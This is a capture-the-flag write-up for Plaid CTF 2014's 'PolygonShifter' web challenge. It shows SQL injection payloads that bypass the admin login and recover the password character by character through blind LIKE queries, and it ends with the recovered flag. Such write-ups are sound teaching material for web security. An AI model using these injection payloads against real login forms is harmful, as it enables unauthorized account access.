# Plaid CTF 2014: PolygonShifter

**Category:** Web
**Points:** 100
**Description:**

> The Plague has purchased the newest invention, _Polygon Shifter_ to protect his website. This cutting edge technology is made available by Polygon Security, and they have a demo page on their [website](http://54.204.80.192/). They claim bots can no longer attack the website protected by the Polygon Shifter. Do we need to manually bruteforce the credentials?

## Write-up

Looking into the source code, we learn that there is a ‘secret’ admin account:

```html
<div class="row">
<div class="medium-10 small-centered columns">
    <h3>To demonstrate our technology, we have a form that is protected with our solution. Humans shall pass, but bots will FAIL.</h3>
    <h3>Test account is test / test</h3>
    <!--<h3>For admin interface, admin / ???????</h3>-->
</div>
</div>
```

Let’s try to log in to this admin account. We don’t have the credentials, so we’ll try SQL injection instead:

* Username: `admin' OR 'a'='a`
* Password: `random`

Great, we’re logged in! We are welcomed with the following message:

> Hello, admin!! My password is the flag!

It seems like we need to find the password using SQL injection. Let’s peek into the source code some more:

```html
<h4 class="product-header">A friendly login form; not so friendly for bots!</h4>
<div class="medium-11 small-centered columns">
    <form action="/P0zxeNVpdjH6myRHaWVS" method="POST">
        <label for="" style="text-align:left;">Username</label>
        <input type="text" id="6lyNestBnznos6FxGtGD" name="dVURHUzXGy69u5thdZY0">
        <label for="bFixmywlQhbkX1uC1oI2" style="text-align:left;">Password</label>
        <input type="password" id="bFixmywlQhbkX1uC1oI2" name="SU8IPPqzwozVlQzuaWSA">
        <input class="primary large" type="submit" value="Login">
    </form>
</div>
```

Okay, we cannot use the `id`s or `name`s of these fields to automate the process since they change for every request. No problem — we don’t really need those anyway. The source code doesn’t seem to have any more input fields, so we can just input our username in whatever’s the first input field on the page, and the password into the second field.

```js
var arr = document.getElementsByTagName('input');
arr[0].value = 'admin';
arr[1].value = "' or (password LIKE '%a%') and 1='1";
```

If we manage to successfully log in as admin using these values, we know that our query succeeded and that there’s an `a` in the password. Using a similar technique, we can slowly figure out the password character by character (cfr. [the WhatsCat challenge write-up](https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/whatscat)).

We wrote a [PhantomJS](http://phantomjs.org/) script for this named [`client.js`](client.js). Run it as follows:

```bash
$ phantomjs client.js "(password like 'a%')"
```

After some testing, we find that the flag is `n0b0t5\_C4n\_bYpa5s\_p0lYm0rph1Sm`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/04/plaidctf-2014-polygonshifter-writeup.html>
* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-polygonshifter/>
* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-100-blind-sql-injection>
* <http://eindbazen.net/2014/04/plaidctf-2014-polygonshifter-100/>
* <http://sigint.ru/writeups/2014/04/13/plaidctf-2014-writeups/#web-100---polygonshifter>
